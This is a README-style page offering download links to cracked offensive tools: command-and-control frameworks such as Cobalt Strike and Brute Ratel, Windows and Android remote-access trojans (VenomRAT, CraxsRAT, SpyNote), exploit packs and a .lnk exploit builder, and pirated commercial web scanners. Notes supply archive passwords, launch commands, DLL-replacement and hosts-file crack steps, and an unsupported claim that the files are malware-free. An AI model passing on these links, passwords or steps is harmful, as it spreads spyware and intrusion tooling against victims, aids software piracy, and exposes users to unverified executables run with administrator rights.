# ⚠️ WARNING ⚠️
All of these tools *have* been checked for malware using both any.run and a real computer for malware. They have passed with no issues whatsoever and are considered clean.<br>***However, please still run these in a virtual machine.***<br><br>Make sure to read notes at the bottom before opening any issue.

# Cracked Red Teaming Tools.
This is a full collection of red teaming tools which have been cracked by other people, if you need me to find anything, let me know via the issues tab.

### C2/RATs
##### Windows
| Tool | Link |
| :--- | ---: |
| Cobalt Strike v4.8 | [Download](https://anonfiles.com/M9r2O1o5z0/CobaltStrike48_pwn3rzs_cyberarsenal_7z) |
| Brute-Ratel | [Download](https://anonfiles.com/pdf5landz8/BruteRatel_zip) |
| VenomRAT v6.0.1 | [Download](https://anonfiles.com/8dS691ibzc) |

##### Android
| Tool | Link |
| :--- | ---: |
| CraxsRAT v3 | [Download](https://anonfiles.com/P9g5x8T8yf/CraxsRat-V3_2023_zip) |
| SpyNote v6.4 | [Download](https://anonfiles.com/N2c4O5ofz5/SpyNote_v6_4_rar) |
<br><br>
### Exploitation Toolkits/Software
###### Windows
| Tool | Link |
| :--- | ---: |
| Immunity CANVAS v7.27 | [Download](https://anonfiles.com/BbzbKc6ay9/CANVAS_7.27_D2ExploitationPack_v2.55_WhitePhosphorus_1.28_Umbreon_leak_at_breached.to_7z) |
| Quantum .lnk Exploit Builder (02-10-22) | [Download](https://anonfiles.com/W0D1o5F5y8/QB20221022_rar) |
| JexBot v1.0 (READ NOTES) | [Download](https://www.upload.ee/files/14829113/Jex2022.zip.html) |

<br><br>
### Web App Security Tools
##### Windows
| Tool | Link |
| :--- | ---: |
| Invicti Pro v23.4 | [Download](https://anonfiles.com/gdEcAfnazc) |
| Burp Suite PRO v2023.4 | [Download](https://anonfiles.com/5d37Odofz5/BurpSuitePro_2023_4_BurpBounty262_7z) |1
| Acunetix Scanner v15.5 | [Download](https://gofile.io/d/ccP4gB) |
| Xray Pro v1.9.4 | [Download]() |
| HCL AppScan v10.1.0 | [Download(https://bayfiles.com/wb50K9I4y3/AppScan_Standard_10.1.0-cracked_CyberArsenal_pwn3rzs_7z) |

##### Linux
| Acunetix Scanner v15.5 | [Download](https://gofile.io/d/jBZIUz) |
| Xray Pro v1.9.4 | [Download](https://krakenfiles.com/view/kGAvyrPSjy/file.html) |

<br><br>
# Notes
###### General
Most of these tools are most probably obtained from the following websites: `cyberarsenal.org`, `xss.is` and other sites I can't remember.<br><br>If a archive asks for a password, try `pwn3rzs`, `Pwn3rzs`, `xss.is`, `XSS.IS` or `exploit.in`

###### Cobalt Strike
For Cobalt Strike you will have to deploy the teamserver on a Linux install such as Ubuntu, or whatever distro of your choice.<br>In order to run the Cobalt Strike client on your Windows install, you will have to run the following command:<br>`java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike-client.jar`.

On Linux, you can simply run `start.sh`.

###### Brute-Ratel
I am not sure whether or not this version of Brute-Ratel works properly, it has not been tested at all, however from the few basic functions *I am assuming it works*. If it does not, someone let me know

###### CraxsRat
This version of CraxsRAT appears to be quite unstable when it comes to connections, if someone wants me to, I can attempt to find a newer version of this rat.

###### Immunity CANVAS
Immunity CANVAS contains the following: `D2 Exploitation Pack v2.55` & `White Phosphorus v1.28`.

###### HCL AppScan
Upon installing AppScan make sure to **replace the installed DLLs with the cracked ones**.

###### Quantum Exploit Builder
Password: `Pwn3rzs`

###### JexBot v1.0
The following installation instructions were obtained from [CyberArsenal](https://cyberarsenal.org/):<br>
```-1 Run add_hosts.bat, would ask for admin perms to allow it, if gives Access denied go manually edit C:\Windows\System32\drivers\etc\hosts file and add
127.0.0.1 jex.tools
127.0.0.1 www.jex.tools
-2 run Jex_crack.exe, open JEX BOT.exe
-3 using mastercho as username and password for JEX BOT.exe login then enter
-4 Done

Note: You can Close Jex_crack.exe after success login into "JEX BOT.exe" and need to repeat from number 2 if you wanna use back JEXBOT2022```
